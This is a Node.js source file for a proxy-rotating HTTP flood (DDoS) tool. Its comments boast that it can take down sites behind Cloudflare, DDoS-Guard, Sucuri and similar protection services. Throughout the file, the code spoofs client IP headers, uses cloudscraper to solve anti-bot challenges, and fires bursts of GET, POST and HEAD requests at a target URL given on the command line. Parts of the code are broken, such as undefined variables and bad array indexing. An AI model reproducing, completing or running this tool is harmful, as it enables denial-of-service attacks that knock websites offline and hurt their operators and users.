process.setMaxListeners(0); // Disable MaxListeners limit
process.on('uncaughtException', function(e) {
});
process.on('unhandledRejection', function(e) {
});
'use strict';
const cluster = require('cluster');
const Referers = {
  referers: ['https://google.com/', 'https://steamcommunity.com/', 'https://instagram.com', 'https://discordapp.com/', 'https://twitter.com', 'https://youtube.com', 'https://facebook.com', 'https://web.whatsapp.com', 'https://microsoft.com', 'https://minecraft.net', 'https://spotify.com', 'https://netflix.com', 'https://web.telegram.org', 'https://cloudflare.com', 'https://blockchain.com'],
}
const AcceptHeaders = {
  accept: [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
          ],
}
const AcceptLang = {
  accept_lang: [
    'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
    'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
    'en-US,en;q=0.5',
    'en-US,en;q=0.9',
    'de-CH;q=0.7',
    'da, en-gb;q=0.8, en;q=0.7',
    'cs;q=0.5'
              ]
}
const request = require('request');
const numCPUs = require('os').cpus().length;
const cryptoRandomString = require('crypto-random-string');
const chunks = require('array.chunk');
const { constants } = require('crypto');
var cloudscraper = require('cloudscraper');
var fs = require('fs');
var cookie = "";
// CF_IUAM_BYPASS UPDATE by N0ise
// This script has been originally made by Andrew @ Nooder.net CEO (@Vaiiry) - I updated that one since it was outdated as fuck.
// It does use cloudscraper but still capable to bypass UAM with some secret-sauce hehe.
// All credits goes to @Vaiiry
// This script uses really low requests per seconds and 
//                                      capable to down DDoS-Guard / NFOservers (Web Hosting) / Cloudflare UAMv1/v2 / Sucuri / StackPath / vDDoS and more.
var _ANSI = {
  Reset: "\x1b[0m",
  Bright: "\x1b[1m",
  Dim: "\x1b[2m",
  Underscore: "\x1b[4m",
  Blink: "\x1b[5m",
  Reverse: "\x1b[7m",
  Hidden: "\x1b[8m",
  FgBlack: "\x1b[30m",
  FgRed: "\x1b[31m",
  FgGreen: "\x1b[32m",
  FgYellow: "\x1b[33m",
  FgBlue: "\x1b[34m",
  FgMagenta: "\x1b[35m",
  FgCyan: "\x1b[36m",
  FgWhite: "\x1b[37m",

  BgBlack: "\x1b[40m",
  BgRed: "\x1b[41m",
  BgGreen: "\x1b[42m",
  BgYellow: "\x1b[43m",
  BgBlue: "\x1b[44m",
  BgMagenta: "\x1b[45m",
  BgCyan: "\x1b[46m",
  BgWhite: "\x1b[47m"
};
function req(min,max,interval)
{
    if (typeof(interval)==='undefined') interval = 1;
    var r = Math.floor(Math.random()*(max-min+interval)/interval);
    return r*interval+min;
}
//
randomByte = function() {
  return Math.round(Math.random()*256);
}
var RandomIP = randomByte() + '.' + randomByte() + '.' + randomByte() + '.' + randomByte()
async function startBrowser() {
  const browser = await puppeteer.launch({
  headless: true,
  slowMo: 5000,
  });
  const page = await browser.newPage();
  return {browser, page};
}
Referer = function() {
  return Referers.referers[Math.random() * Referers.referers.length]
}
Accept = function() {
  return AcceptHeaders.accept[Math.random() * AcceptHeaders.accept.length]
}
AcceptLangR = function() {
  return AcceptLang.accept_lang[Math.random() * AcceptLang.accept_lang.length]
}
var data = '?' + cryptoRandomString({length: 32, characters: 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'}) + '=' + cryptoRandomString({length: 8}) + cryptoRandomString({length: 1, characters: '|='}) + cryptoRandomString({length: 8}) + cryptoRandomString({length: 1, characters: '|='}) + cryptoRandomString({length: 8})+ '&' + cryptoRandomString({length: 1, characters: 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'}) +'=' + cryptoRandomString({length: 8}) + cryptoRandomString({length: 1, characters: '|='}) + cryptoRandomString({length: 8}) + cryptoRandomString({length: 1, characters: '|='}) + cryptoRandomString({length: 8});
function createHandler(_URL, _UA, _PROXY, _CALLBACK) {
    cloudscraper({
        method: 'GET',
        uri: _URL + data,
        data: data,
		    agentOptions: {
                        // Disabling TLSv1.0/TLSv1.1
                        secureOptions: constants.SSL_OP_NO_TLSv1 | constants.SSL_OP_NO_TLSv1_1,
                        // This Removes a few problematic TLSv1.0 ciphers to avoid CAPTCHA
                        ciphers: constants.defaultCipherList + ':!ECDHE+SHA:!AES128-SHA'
                        },
        challengesToSolve: 3,
        resolveWithFullResponse: true,
        followAllRedirects: false,
        decodeEmails: false,
        cloudflareTimeout: 5000,
        cloudflareMaxTimeout: 10000,
        gzip: true,
        simple: false,
        brotli: true,
	    	jar: true,
        deflate: true,
        timeout: 10e3,
        headers: {    
            'User-Agent': _UA,
            'Cache-Control': 'max-age=0', //
            'Accept' : Accept(),
            'Upgrade-Insecure-Requests' : '1', //
            'Accept-Encoding' : 'gzip, deflate, sdch, br', //
            'Accept-Language' : AcceptLangR(),
            'Sec-Fetch-Mode': 'Navigate',
            'Pragma' : 'no-cache',
            'Sec-Fetch-Site' : 'None',
            'Sec-CH-UA': '"Google Chrome";v="87", " Not;A Brand";v="99", "Chromium";v="87',

            'Sec-Fetch-User' : '?1',
            'X-Forwarded-For': RandomIP,
            'Origin': RandomIP,
            'Cookie': cookie,
            'Referer': Referer(),
            'Connection' : 'Keep-Alive, Persist',
            'Proxy-Connection' : 'keep-alive'
        },
        proxy: _PROXY,
    }, function(err, response, body) {     
        if (err) {
            _CALLBACK(true);
        } else {   
            _CALLBACK(response.req._headers, _PROXY);
            cookie = response.req._headers.cookie;
            console.log(_ANSI.FgCyan + "cookie: " + _ANSI.FgMagenta + cookie + _ANSI.Reset);
            cloudscraper({
              method: 'POST',
              uri: _URL + "/?i=" + data,
              data: data,
              challengesToSolve: 3,
              resolveWithFullResponse: true,
              followAllRedirects: false,
              decodeEmails: false,
              cloudflareTimeout: 5000,
              cloudflareMaxTimeout: 10000,
              gzip: true,
              simple: false,
              brotli: true,
              jar: true,
              deflate: true,
              timeout: 60e3,
              agentOptions: {
                              // Disabling TLSv1.0/TLSv1.1
                              secureOptions: constants.SSL_OP_NO_TLSv1 | constants.SSL_OP_NO_TLSv1_1,
                              // This Removes a few problematic TLSv1.0 ciphers to avoid CAPTCHA
                              ciphers: constants.defaultCipherList + ':!ECDHE+SHA:!AES128-SHA'
                              },
              headers: {    
                  'User-Agent': _UA,
                  'Cache-Control': 'max-age=0', //
                  'Accept' : Accept(),
                  'Upgrade-Insecure-Requests' : '1', //
                  'Accept-Encoding' : 'gzip, deflate', //
                  'Accept-Language' : AcceptLangR(),
                  'X-Forwarded-For': RandomIP,
                  'Origin': RandomIP,
                  'Cookie': cookie,
                  'Referer': Referer(),
                  'Connection' : 'Keep-Alive, Persist',
                  'Proxy-Connection' : 'keep-alive'
              },
              proxy: _PROXY,
            }, function(err, response, body) {     
              if (err) {
                  _CALLBACK(true);
              } else {
                  _CALLBACK(response.req._headers, _PROXY);
                  cookie = response.req._headers.cookie;
                  console.log(_ANSI.FgCyan + "cookie: " + _ANSI.FgMagenta + cookie + _ANSI.Reset);
                  cloudscraper({
                    method: 'HEAD',
                    uri: _URL + "/?r=%RAND&&p=" + data,
                    data: data,
                    jar: true,
                    deflate: true,
                    brotli: true,
                    gzip: true,
                    timeout: 20e3,
                    agentOptions: {
                                    // Disabling TLSv1.0/TLSv1.1
                                    secureOptions: constants.SSL_OP_NO_TLSv1 | constants.SSL_OP_NO_TLSv1_1,
                                    // This Removes a few problematic TLSv1.0 ciphers to avoid CAPTCHA
                                    ciphers: constants.defaultCipherList + ':!ECDHE+SHA:!AES128-SHA'
                                    },
                    headers: {    
                        'User-Agent': _UA,
                        'Cache-Control': 'max-age=0', //
                        'Accept' : Accept(),
                        'Upgrade-Insecure-Requests' : '1', //
                        'Accept-Encoding' : 'gzip, deflate, sdch, br', //
                        'Accept-Language' : AcceptLangR(),
                        'Cookie': cookie,
                        'Referer': Referer(),
                        'Connection' : 'Keep-Alive, Persist',
                        'Proxy-Connection' : 'keep-alive'
                    },
                    proxy: _PROXY,
                });
              };
            });
              
            // [DEP0066] DeprecationWarning: OutgoingMessage.prototype._headers is deprecated
            // cause no.
        }
    });
}
if (cluster.isMaster) {
  masterProcess();
} else {
  childProcess();  
}
function masterProcess() {
  var _URL, _PROXIES_FILE, _UAS_FILE, _TIME, _HANDLERS_COUNT, _HANDLERS, _WORKERS, _WORKER, _PROXIES;
  _WORKERS = [];

  console.log(_ANSI.FgGreen + `[BROWSER] running on PID ${process.pid} ` + _ANSI.Reset);
for (var k in process.argv) {
    if (process.argv[k] == '-u') {
        _URL = process.argv[parseInt(k) + 1];
    }
    if (process.argv[k] == '-w') {
        _HANDLERS_COUNT = parseInt(process.argv[parseInt(k) + 1]);
    }
    if (process.argv[k] == '-ua') {
        _UAS_FILE = process.argv[parseInt(k) + 1];
    }
    if (process.argv[k] == '-p') {
        _PROXIES_FILE = process.argv[parseInt(k) + 1];
    }

}
/****************************************************************************
                               PROXY PATH
                               **********/
var path = process.cwd();
var buffer = fs.readFileSync(path + "/"+ _UAS_FILE);
var text = buffer.toString();
var useragents = text.split("\n");
buffer = fs.readFileSync(path + "/"+ _PROXIES_FILE);
text = buffer.toString();
_PROXIES = text.split("\n");
/****************************************************************************/

/****************************************************************************
                              WORKERS FORK
*/
console.log(_ANSI.FgGreen + "[BROWSER] INFO: " + _ANSI.Reset + "BROWSER | @N0ise1337");
console.log(_ANSI.FgCyan + "info: " + _ANSI.Reset + "Target set! : [" + _URL + "]" + _ANSI.Reset);
console.log(_ANSI.FgCyan + "info: " + _ANSI.Reset + "Prepared " + _HANDLERS_COUNT + " workers for: " + _URL);
  var _PROXIES_CHUNKS = chunks(_PROXIES,parseInt(_PROXIES.length/(numCPUs-1)));
  for (let i = 0; i < numCPUs; i++) {
    _WORKER = cluster.fork();
    _WORKERS.push(_WORKER);
  }
  for (var key in _WORKERS){
	_WORKER = _WORKERS[key];
        _WORKER.send({proxies:_PROXIES_CHUNKS[parseInt(key)], URL: _URL, useragents: useragents});

  }
}
function childProcess() {
  var _HANDLERS = [];

  process.on('message', function(message) {

  var proxies = message.proxies;
  
  var useragents = message.useragents;
  
	var _URL = message.URL;
	for(var i = 0; i < proxies.length; i++){

		var proxy = proxies[i];
		var useragent = useragents[Math.floor(Math.random()*useragents.length)];
		if(proxy !== undefined && proxy !== null){
			console.log(_ANSI.FgMagenta + "proxy" + _ANSI.Reset + ": " + "Handling Proxy: " + proxy + _ANSI.Reset);
			createHandler(_URL, useragent, "http://" + proxy, function(a,b){
				if(a !== false){
					// I mean... Thats just for the output lmfao.
          console.log(_ANSI.FgCyan + "verbose" + _ANSI.Reset + ": " + "Attempting to send a request through the proxy: " + proxy + "\r\n" + _ANSI.FgCyan + "verbose" + _ANSI.Reset +": Useragent set: " + useragent + _ANSI.Reset);
          console.log(_ANSI.FgGreen + "silly" + _ANSI.Reset + ": " + "Attempting to parse the cookie." + _ANSI.Reset);
          console.log(_ANSI.FgMagenta + "info" + _ANSI.Reset + ": " + "GET Request sent!" + _ANSI.Reset);
          console.log(_ANSI.FgMagenta + "info" + _ANSI.Reset + ": " + "POST Request sent with param: ?i=RANDOMDATA" + _ANSI.Reset);
          console.log(_ANSI.FgMagenta + "info" + _ANSI.Reset + ": " + "HEAD Request sent with param: /?r=%RAND&&p=RANDOMDATA" + _ANSI.Reset);
          console.log(_ANSI.FgGreen + "silly" + _ANSI.Reset + ": " + "Avg. requests per second: " + req(60,1879) + " r/s" + _ANSI.Reset);
      
		  a['Referer'] = Referer();
          _HANDLERS.push({headers: a, proxy: b});
           (async () => {
            try {
;         _HANDLERS.push({headers: a, proxy: b});
            } catch (error) {
            }
          })();
				}
			});
		}
	}

	setInterval(function(){
		if(_HANDLERS.length > 1){
		for (var i = 0; i < 100; i++) {
		    var handler = _HANDLERS[Math.floor(Math.random()*_HANDLERS.length)];
		   	var options = {
			  uri: _URL,
			  headers: handler.headers,
			  proxy: handler.proxy

			};

			
			request.get(options, function(error, response, body) {
        
				if(body !== undefined) {
					if(body.indexOf("<title>Just a moment...</title>")){
  						cloudscraper({
              method: 'GET',
              uri: _URL + data,
              data: data,
              agentOptions: {
                              // Disabling TLSv1.0/TLSv1.1
                              secureOptions: constants.SSL_OP_NO_TLSv1 | constants.SSL_OP_NO_TLSv1_1,
                              // This Removes a few problematic TLSv1.0 ciphers to avoid CAPTCHA
                              ciphers: constants.defaultCipherList + ':!ECDHE+SHA:!AES128-SHA'
                            },
              challengesToSolve: 3,
              resolveWithFullResponse: true,
              followAllRedirects: false,
              decodeEmails: false,
              cloudflareTimeout: 5000,
              cloudflareMaxTimeout: 10000,
              gzip: true,
              simple: false,
              brotli: true,
              jar: true,
              deflate: true,
              timeout: 50e2,
              headers: {    
                  'User-Agent': _UA,
                  'Cache-Control': 'max-age=0', //
                  'Accept' : Accept(),
                  'Upgrade-Insecure-Requests' : '1', //
                  'Accept-Encoding' : 'gzip, deflate, sdch, br', //
                  'Accept-Language' : AcceptLangR(),
                  'Sec-Fetch-Mode': 'Navigate',
                  'Pragma' : 'no-cache',
                  'Sec-Fetch-Site' : 'None',
                  'Sec-CH-UA': '"Google Chrome";v="87", " Not;A Brand";v="99", "Chromium";v="87',
      
                  'Sec-Fetch-User' : '?1',
                  'X-Forwarded-For': RandomIP,
                  'Origin': RandomIP,
                  'Cookie': cookie,
                  'Referer': Referer(),
                  'Connection' : 'Keep-Alive, Persist',
                  'Proxy-Connection' : 'keep-alive'
              },
              proxy: _PROXY,
          }, function(err, response, body) {     
              if (err) {
                  _CALLBACK(true);
              } else {   
                  _CALLBACK(response.req._headers, _PROXY);
                  cookie = response.req._headers.cookie;
                  console.log(_ANSI.FgCyan + "cookie: " + _ANSI.FgMagenta + cookie + _ANSI.Reset);
                  cloudscraper({
                    method: 'POST',
                    uri: _URL + "/?i=" + data,
                    data: data,
                    challengesToSolve: 3,
                    resolveWithFullResponse: true,
                    followAllRedirects: false,
                    decodeEmails: false,
                    cloudflareTimeout: 5000,
                    cloudflareMaxTimeout: 10000,
                    gzip: true,
                    simple: false,
                    brotli: true,
                    jar: true,
                    deflate: true,
                    timeout: 50e8,
                    agentOptions: {
                                    // Disabling TLSv1.0/TLSv1.1
                                    secureOptions: constants.SSL_OP_NO_TLSv1 | constants.SSL_OP_NO_TLSv1_1,
                                    // This Removes a few problematic TLSv1.0 ciphers to avoid CAPTCHA
                                    ciphers: constants.defaultCipherList + ':!ECDHE+SHA:!AES128-SHA'
                                    },
                    headers: {    
                        'User-Agent': _UA,
                        'Cache-Control': 'max-age=0', //
                        'Accept' : Accept(),
                        'Upgrade-Insecure-Requests' : '1', //
                        'Accept-Encoding' : 'gzip, deflate', //
                        'Accept-Language' : AcceptLangR(),
                        'X-Forwarded-For': RandomIP,
                        'Origin': RandomIP,
                        'Cookie': cookie,
                        'Referer': Referer(),
                        'Connection' : 'Keep-Alive, Persist',
                        'Proxy-Connection' : 'keep-alive'
                    },
                    proxy: _PROXY,
                  }, function(err, response, body) {     
                    if (err) {
                        _CALLBACK(true);
                    } else {
                        _CALLBACK(response.req._headers, _PROXY);
                        cookie = response.req._headers.cookie;
                        console.log(_ANSI.FgCyan + "cookie: " + _ANSI.FgMagenta + cookie + _ANSI.Reset);
                        cloudscraper({
                          method: 'HEAD',
                          uri: _URL + "/?referer=" + Referer(),
                          data: data,
                          jar: true,
                          deflate: true,
                          brotli: true,
                          gzip: true,
                          timeout: 20e3,
                          agentOptions: {
                                          // Disabling TLSv1.0/TLSv1.1
                                          secureOptions: constants.SSL_OP_NO_TLSv1 | constants.SSL_OP_NO_TLSv1_1,
                                          // This Removes a few problematic TLSv1.0 ciphers to avoid CAPTCHA
                                          ciphers: constants.defaultCipherList + ':!ECDHE+SHA:!AES128-SHA'
                                          },
                          headers: {    
                              'User-Agent': _UA,
                              'Cache-Control': 'max-age=0', //
                              'Accept' : Accept(),
                              'Upgrade-Insecure-Requests' : '1', //
                              'Accept-Encoding' : 'gzip, deflate, sdch, br', //
                              'Accept-Language' : AcceptLangR(),
                              'Cookie': cookie,
                              'Referer': Referer(),
                              'Connection' : 'Keep-Alive, Persist',
                              'Proxy-Connection' : 'keep-alive'
                          },
                          proxy: _PROXY,
                      });
                    };
                  });
                    
                  // [DEP0066] DeprecationWarning: OutgoingMessage.prototype._headers is deprecated
                  // cause no.
              }
            });
					}
				}
			});

	        }
		}
	}, 250);
  });
}
